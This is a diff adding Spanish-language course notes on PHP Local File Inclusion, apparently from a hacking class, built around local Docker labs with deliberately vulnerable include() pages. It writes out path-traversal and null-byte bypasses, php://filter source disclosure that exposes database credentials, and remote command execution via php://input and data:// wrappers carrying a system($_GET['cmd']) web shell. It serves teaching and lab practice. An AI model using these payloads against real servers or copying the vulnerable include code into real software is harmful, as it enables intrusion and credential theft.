@@ -3085,3 +3085,308 @@ Para prevenir los ataques LFI, es importante que los desarrolladores de aplicaci
 A continuación, se proporciona el enlace directo a la herramienta que utilizamos al final de esta clase para abusar de los '**Filter Chains**' y conseguir así ejecución remota de comandos:
 
 [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)
+
+[Explotación de PHP Wrappers](https://blog.deephacking.tech/es/posts/explotacion-de-php-wrappers/)
+
+```bash
+pushd /var/www/html
+
+nvim test
+# +++++ test.php inicio
+Esto es una prueba
+# +++++ test.php fin
+
+nvim index.php
+# +++++ index.php inicio
+<?php
+    $filename = $_GET['filename'];
+    include($filename);
+?>
+# +++++ test.php fin
+
+service apache2 start
+
+sudo lsof -i :80
+
+# En el navegador
+http://localhost/index.php?filename=test # Debemos de ver el archivo test
+http://localhost/index.php?filename=/etc/passwd # Ctrl + u para ver mejor 
+http://localhost/index.php?filename=/etc/hosts # Ctrl + u para ver mejor 
+http://localhost/index.php?filename=/etc/hostname # Ctrl + u para ver mejor 
+
+
+# MODIFICACION ---------------------
+nvim index.php
+# +++++ index.php inicio
+<?php
+    $filename = $_GET['filename'];
+    include("/var/www/html/" . $filename); # Obligamos a buscar en la ruta, el . es para concatenar
+?>
+# +++++ test.php fin
+
+# En el navegador
+http://localhost/index.php?filename=../../../../../../../../etc/passwd # Hacemos path traversal
+
+
+
+
+
+# MODIFICACION ---------------------
+nvim index.php
+# +++++ index.php inicio
+<?php
+    $filename = $_GET['filename'];
+    $filename = str_replace("../", "", $filename);
+
+    include("/var/www/html/" . $filename); # Obligamos a buscar en la ruta, el . es para concatenar
+?>
+# +++++ test.php fin
+
+# En el navegador
+http://localhost/index.php?filename=..../..../..../..../..../..../..../..../etc/passwd # Hacemos path traversal porque no es recursiva la sanitizacion
+
+
+
+
+
+# MODIFICACION ---------------------
+nvim index.php
+# +++++ index.php inicio
+<?php
+    $filename = $_GET['filename'];
+    $filename = str_replace("../", "", $filename);
+
+    if(preg_match("/\/etc\/passwd/", $filename) === 1){
+        echo "\n[!] No es posible visualizar el contenido de este archivo\n";
+    }else {
+            include("/var/www/html/" . $filename); # Obligamos a buscar en la ruta, el . es para concatenar
+    }
+?>
+# +++++ test.php fin
+
+# En el navegador
+http://localhost/index.php?filename=..../..../..../..../..../..../..../..../etc////////hostname # Hacemos path traversal porque solo excluimos passwd
+http://localhost/index.php?filename=..../..../..../..../..../..../..../..../etc////////passwd # Hacemos path traversal porque solo excluimos passwd
+# El empleo de preg_match tampoco es una buena idea
+
+
+
+
+
+# MODIFICACION ---------------------
+nvim index.php
+# +++++ index.php inicio
+<?php
+    $filename = $_GET['filename'];
+    $filename = str_replace("../", "", $filename);
+
+    include("/var/www/html" . $filename . ".php");
+?>
+# +++++ test.php fin
+
+# En el navegador
+http://localhost/index.php?filename=..../..../..../..../..../..../..../..../etc/hostname # De esta manera obligamos a usar la extension .php
+
+# Savitar comenta que podríamos saltar esta restricción si la version de php fuera menor a 5.x haciendo lo siguiente con un null byte
+http://localhost/index.php?filename=..../..../..../..../..../..../..../..../etc/passwd%00 # Null byte %00
+
+
+
+
+
+docker pull tommylau/php-5.2
+docker images
+docker run -dit --name testing idImage
+docker ps
+docker exec -it testing bash 
+php --version
+php --interactive
+include("/etc/hosts" . ".php");
+enter
+include("/etc/hosts\0" . ".php");
+# Nos muestra el etc/hosts
+php -r "echo 'hola';"; echo
+# Nos muestra: hola
+php -r 'if(substr($argv[1],-6,6)!="passwd") include($argv[1]);' '/etc/passwd'; echo
+# Nos muestra: nada
+php -r 'if(substr($argv[1],-6,6)!="passwd") include($argv[1]);' '/etc/hosts'; echo
+# Nos muestra: el archivo
+
+docker rm $(docker ps -a -q) --force
+docker rmi $(docker images -q)
+docker images
+
+
+
+
+
+# Jugamos con un proyecto de GitHub
+git clone https://github.com/NetsecExplained/docker-labs
+
+cd docker-labs/file-inclusion/college_website
+
+docker-compose up -d
+
+docker ps
+
+docker port college_website_web_1
+
+# En el navegador
+http://localhost:8081
+
+# Damos clic en courses y vemos la url
+http://localhost:8081/index.php?page=courses
+
+# Vemos a donde apunta cada uno de los sitios a los que hacemos clic
+
+# Estando en home
+http://localhost:8081/index.php?page=/etc/passwd # Nos devuelve la salida en la pagina
+
+# Estando en courses
+http://localhost:8081/courses.php # Vemos que existe un recurso course.php, lo que nos hace pensar que hay concatenacion de courses + courses.php en la pagina
+
+http://localhost:8081/index.php?page=/etc/passwd%00 # No nos muestra nada
+
+
+# s4vitar nos muestra en el contenedor
+docker exec -it college_website_web_1 bash
+ls
+apt update && apt install nano
+nano index.php
+# ctrl + w: buscamos -> page
+# aqui quitamos la concatenacion .php
+
+# En el navegador, deberiamos agregar la extension manualmente
+http://localhost:8081/index.php?page=courses.php # Usuarios apuntan que nano no sirvió
+
+http://localhost:8081/index.php?page=/etc/passwd # Nos muestra el archivo
+
+http://localhost:8081/index.php?page=index.php # Se llama recursivamente DOS
+
+http://localhost:8081/index.php?page=php://filter/convert.base64-encode/resource=index.php # Vemos el index en base64
+
+# abrimos el codigo fuente y copiamos la cadena
+
+nvim data # pegamos lo copiado
+
+cat data | base64 -d | sponge data
+
+cat data # Vemos la pagina, dentro vemos que incluye un db_connect.php
+
+http://localhost:8081/index.php?page=php://filter/convert.base64-encode/resource=admin/db_connect.php
+
+# abrimos el codigo fuente y copiamos la cadena en base64
+
+nvim data # pegamos lo copiado
+
+cat data | base64 -d | sponge data
+
+cat data # Vemos las credenciales de la base de datos
+
+
+
+
+# Nos montamos nuestro propio laboratorio
+docker pull ubuntu:latest
+docker images
+service apache2 stop
+docker run -dit -p 80:80 --name  testing idImage
+docker exec -it testing bash
+
+apt update && apt install nano apache2 php -y
+
+service apache2 start
+cd /var/www/html
+rm index.html
+nano index.php
+<?php
+    echo "Hola";
+?>
+
+# Validar en el navegador que funcione PHP
+http://localhost/index.php # Debemos ver hola
+
+
+
+# Primer archivo php ------------------
+<?php
+    $filename = $_GET['filename'];
+    include($filename);
+?>
+
+# Segundo archivo php ------------------
+nano secret.php
+<?php
+    // No deberias poder verme, dado que este codigo deberia ser interpretado
+?>
+
+# En el navegador
+http://localhost/?filename=/etc/passwd # Ctrl + u
+
+http://localhost/?filename=secret.php # Ctrl + u
+
+
+# Wrappers LFI
+# Segundo archivo php ------------------
+nano secret.php
+<?php
+    // No deberias poder verme, dado que este codigo deberia ser interpretado
+    echo "Hola que tal";
+?>
+
+
+http://localhost/?filename=php://filter/convert.base64-encode/resource=secret.php # Ctrl + u, Vemos el archivo que no deberiamos poder ver
+echo -n "salida" | base64 -d; echo
+
+
+
+http://localhost/?filename=php://filter/read=string.rot13/resource=secret.php # Rotacion 13
+cat data | tr '[c-za-bC-ZA-B]' '[p-za-oP-ZA-O]'
+
+
+
+http://localhost/?filename=php://filter/convert.iconv.utf-8.utf-16/resource=secret.php #
+
+
+
+# Abrimos el burpsuite y habilitamos el foxyproxy
+http://localhost/?filename=hola # Lo interceptamos en burp-> Proxy Intercept -> colocamos el cursor en el response de intercept -> lo mandamos al repeater con ctrl + r -> Renombramos a RCE
+
+# En la cabecera modificamos por
+GET /?filename=expect://whoami HTTP/1.1 # No funcionará
+
+POST /?filename=php://input HTTP/1.1 # Al final de el archivo colocamos 
+<?php system('whoami'); ?> # Una vez hecho ctrl + space  
+
+
+nano ./etc/php/8.1/apache2/php.ini
+# Savitar menciona que esta configuracion no es necesaria ahora, RFI
+# Filtramos por: allow_url_
+# Establecemos en allow_url_include=on
+service apache2 restart
+# Ctrl + space
+# Regresa savitar a get porque le mandaba error 500
+# Clic derecho
+# Change request method
+# Nos lo cambia de GET a POST
+POST /?filename=php://input HTTP/1.1
+<?php system("whoami"); ?>
+<?php system("id"); ?>
+
+
+# Encodeamos en base64 lo siguiente
+<?php system("whoami"); ?> # El texto que nos devuelve lo pegamos abajo -> textoEnBase64
+GET /?filename=data://text/plain;base64,textoEnBase64 HTTP/1.1 # Ctrl + space
+
+
+
+<?php system($_GET["cmd"]); ?> # Lo encodeamos a base64
+GET /?filename=data://text/plain;base64,textoEnBase64+&cmd=whoami HTTP/1.1 # El + que tenemos al final de la cadena nos impide ejecutar el comando, hacemos lo sig
+# Lo seleccionamos y con ctrl + u estaremos encodeando el "+" a %2b
+# Ahora sí hacemos ctrl + space y deberiamos poder ver la salida
+
+GET /?filename=data://text/plain;base64,textoEnBase64+&cmd=id HTTP/1.1 # Ctrl + space
+
+
+
+```
